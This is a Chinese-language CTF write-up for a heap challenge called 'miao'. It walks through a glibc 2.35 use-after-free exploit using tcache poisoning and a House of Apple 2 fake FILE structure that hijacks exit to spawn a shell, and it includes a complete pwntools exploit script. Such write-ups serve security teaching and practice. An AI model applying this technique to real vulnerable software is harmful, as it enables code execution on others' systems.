# pwn-miao

## 题面
一只可爱的小猫  

给了 ld, libc 和二进制文件。  
```
Archive:  pwn2.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   240936  2026-03-14 21:23   ld-linux-x86-64.so.2
  2220400  2026-03-14 21:23   libc.so.6
    20928  2026-04-13 19:21   miao
---------                     -------
  2482264                     3 files
```

## 分析
patchelf， 然后看 libc 为 2.35。  
```
❯ strings libc.so.6 | grep 'GNU C Library'
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) stable release version 2.35.
```

ida pro 静态分析：  
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  puts(s: "Here is a cute cat.");
  puts(s: "  /\\_/\\  \n");
  puts(s: " (  o.o  ) \n");
  puts(s: "\n");
  while ( 1 )
  {
    menu();
    switch ( read_num() )
    {
      case 1uLL:
        add_note();
        break;
      case 2uLL:
        delete_note();
        break;
      case 3uLL:
        show_note();
        break;
      case 4uLL:
        edit_note();
        break;
      case 5uLL:
        puts(s: "Bye!");
        return 0;
      default:
        puts(s: "Invalid!");
        break;
    }
  }
}
```

没有 prctl，可以用 execve。  
add_note:  
``` c
void add_note()
{
  int idx; // [rsp+8h] [rbp-18h]
  int i; // [rsp+Ch] [rbp-14h]
  size_t size; // [rsp+10h] [rbp-10h]

  idx = -1;
  for ( i = 0; i <= 15; ++i )
  {
    if ( notes[i].content == nullptr )
    {
      idx = i;
      break;
    }
  }
  if ( idx == -1 )
  {
    puts(s: "No free slot!");
  }
  else
  {
    printf(format: "Size: ");
    size = read_num();
    if ( size != 0 && size <= 0x500 )
    {
      notes[idx].content = (char *)malloc(size);
      if ( notes[idx].content != nullptr )
      {
        notes[idx].size = size;
        memset(s: notes[idx].content, c: 0, n: size);
        printf(format: "Content: ");
        read(fd: 0, buf: notes[idx].content, nbytes: size);
        printf(format: "Note %d created.\n", idx);
      }
      else
      {
        puts(s: "Allocation failed!");
      }
    }
    else
    {
      puts(s: "Invalid size!");
    }
  }
}
```

分配堆，比较恶心的是有一个 memset，没办法做些泄漏，但后面给了 read 可以做伪造堆。  

delete_note:  
```c 
void delete_note()
{
  size_t idx; // [rsp+0h] [rbp-10h]

  printf(format: "Index: ");
  idx = read_num();
  if ( idx <= 0xF && notes[idx].content != nullptr )
  {
    free(ptr: notes[idx].content);
    puts(s: "Note deleted.");
  }
  else
  {
    puts(s: "Invalid index!");
  }
}
```

经典 UAF。  

show_note：
``` c
void show_note()
{
  size_t idx; // [rsp+0h] [rbp-10h]

  printf(format: "Index: ");
  idx = read_num();
  if ( idx <= 0xF && notes[idx].content != nullptr )
  {
    printf(format: "Content: ");
    write(fd: 1, buf: notes[idx].content, n: notes[idx].size);
    putchar(c: 10);
  }
  else
  {
    puts(s: "Invalid index!");
  }
}
```

edit_note：  
```c
void edit_note()
{
  size_t idx; // [rsp+0h] [rbp-10h]

  printf(format: "Index: ");
  idx = read_num();
  if ( idx <= 0xF && notes[idx].content != nullptr )
  {
    printf(format: "Content: ");
    if ( (int)read(fd: 0, buf: notes[idx].content, nbytes: notes[idx].size) > 0 )
      notes[idx].content[notes[idx].size] = 0;
  }
  else
  {
    puts(s: "Invalid index!");
  }
}
```

可以 UAF，但是重新分配有 memset 把数据清空了。导致 _environ 没办法泄漏栈地址，无法做栈溢出。  

## 利用
前面试了好些时间来做 tcache poison 泄漏 _environ 打栈地址，无果。之后用 FROP，也就是 House of apple 2。  

封装程序行为的函数：
``` python
def select(id: int):
    io.recvuntil(b">> ")
    io.sendline(str(id).encode())


def add(size: int, content: bytes):
    select(1)
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content: ")
    io.send(content)


def delete(idx: int):
    select(2)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def show(idx: int):
    select(3)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    select(4)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.send(content)
```
先把 libc 和 heap 给泄漏了。libc 2.35 有 safe_unlink，必须拿到堆的基址 << 12 的数据。  

泄漏 libc 基址：  
``` python
add(0x450, b"0000")  # 0
add(0x20, b"1111")  # 1
delete(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x21ACE0
print(b"libc base =", hex(libc_base))

environ = libc.sym["_environ"] + libc_base
stderr = libc_base + libc.sym["_IO_2_1_stderr_"]
io_list_all = libc_base + libc.sym["_IO_list_all"]
print("environ address =", hex(environ))
```

泄漏堆：  
``` python
add(0xFF, b"2222")  # 2
delete(2)
show(2)
heap_xor = u64(io.recvuntil(b"\x05")[-5:].ljust(8, b"\x00"))
print("heap =", hex(heap_xor))
```

本来想打 _IO_2_1_stderr_ 再次泄漏栈地址的，同样无果，就构造三个 IO 结构体：`_IO_FILE`, `_IO_wide_data`, `_wide_vtable`。  
用 exit 调用时候清理 IO 数据流劫持控制流拿到 system。  
先构造伪造 `_IO_FILE`:  
``` python
fake_file = flat(
    {
        0x00: b" sh\x00",
        0x28: p64(1),
        0x88: p64(fake_file_addr),
        0xA0: p64(fake_wide_addr),
        0xD8: p64(libc_base + libc.sym["_IO_wfile_jumps"]),
    },
    filler=b"\x00",
)
```
将 _flag 字段作为后面 system 的参数，且满足 `_IO_vtable_offset(fp) == 0`  
0x28 字段是 `_IO_write_ptr=1` 。0x88 ：`_lock = fake_file_addr` 写要分配给 file 的堆地址，这里给它加锁。  
0xa0 `_wide_data = fake_wide_addr` 指向伪造 `_IO_wide_data` 结构体的堆。  
0xd8：写 `_IO_wfile_jumps` 地址通过 `IO_validate_vtable` 检验。  

伪造 `_IO_wide_data`，让 libc 调用 system。  
```python
fake_wide = flat(
    {0x18: p64(0), 0x30: p64(0), 0xE0: p64(fake_vtable_addr)}, filler=b"\x00"
)
```

0x18 是 `_IO_write_base=0`为了让 `_IO_write_ptr` 能大于它，绕过检查。  
0x30 是`_IO_buf_base = 0` 触发 `_IO_WDOALLOCATE` 开关，进入 `_IO_WDOALLOCATE`，读取虚函数表。  
0xe0 指向伪造的 `_wide_vtable`。  

```python
fake_vtable = flat({0x68: p64(libc_base + libc.symbols["system"])}, filler=b"\x00")
```
将 `_doallocate` 劫持为 system 地址，且 `_IO_WDOALLOCATE` 把 fp 放入 rdi ，最开始就是 sh 这样就执行了 sh。  

最后用 gdb 动调把 3 个堆首 12 位地址拿到，依据这些结构体的大小设定堆大小。  
``` python
add(0x100, fake_file)  # 3
add(0xf0, fake_wide) # 4
add(0x80, fake_vtable) # 5
```
做一个 tcache poison 拿到 `_IO_list_all` 任意写，改写成 fake_file。  

``` python
add(0x30, b"666") # 6
add(0x30, b"7777") # 7

delete(6)
delete(7)

store_io_list_all = heap_xor ^ io_list_all

edit(7, p64(store_io_list_all))
add(0x30, b"1")
add(0x30, p64(fake_file_addr))
```

最后调用 exit，拿到 flag。  

```python
io.sendline(b"5")
io.interactive()
```

## exp
``` python
from pwn import *

io = process("./miao")
#io = remote("challenge.xiaoyuyc.com", 47780)
libc = ELF("./libc.so.6")
elf = ELF("./miao")

context.log_level = "debug"


def select(id: int):
    io.recvuntil(b">> ")
    io.sendline(str(id).encode())


def add(size: int, content: bytes):
    select(1)
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content: ")
    io.send(content)


def delete(idx: int):
    select(2)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def show(idx: int):
    select(3)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    select(4)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.send(content)


add(0x450, b"0000")  # 0
add(0x20, b"1111")  # 1
delete(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x21ACE0
print(b"libc base =", hex(libc_base))

environ = libc.sym["_environ"] + libc_base
stderr = libc_base + libc.sym["_IO_2_1_stderr_"]
io_list_all = libc_base + libc.sym["_IO_list_all"]
print("environ address =", hex(environ))

add(0xFF, b"2222")  # 2
delete(2)
show(2)
heap_xor = u64(io.recvuntil(b"\x05")[-5:].ljust(8, b"\x00"))
print("heap =", hex(heap_xor))

fake_file_addr = (heap_xor << 12) + 0x2A0
print("fake_file address =", hex(fake_file_addr))
fake_wide_addr = (heap_xor << 12) + 0x3b0
print("fake_wide address =", hex(fake_wide_addr))
fake_vtable_addr = (heap_xor << 12) + 0x4b0
print("fake_vtable address =", hex(fake_vtable_addr))
fake_file = flat(
    {
        0x00: b" sh\x00",
        0x28: p64(1),
        0x88: p64(fake_file_addr),
        0xA0: p64(fake_wide_addr),
        0xD8: p64(libc_base + libc.sym["_IO_wfile_jumps"]),
    },
    filler=b"\x00",
)

fake_wide = flat(
    {0x18: p64(0), 0x30: p64(0), 0xE0: p64(fake_vtable_addr)}, filler=b"\x00"
)

fake_vtable = flat({0x68: p64(libc_base + libc.symbols["system"])}, filler=b"\x00")

add(0x100, fake_file)  # 3
add(0xf0, fake_wide) # 4
add(0x80, fake_vtable) # 5

add(0x30, b"666") # 6
add(0x30, b"7777") # 7

delete(6)
delete(7)

store_io_list_all = heap_xor ^ io_list_all

edit(7, p64(store_io_list_all))
add(0x30, b"1")
add(0x30, p64(fake_file_addr))

io.sendline(b"5")

io.interactive()
```


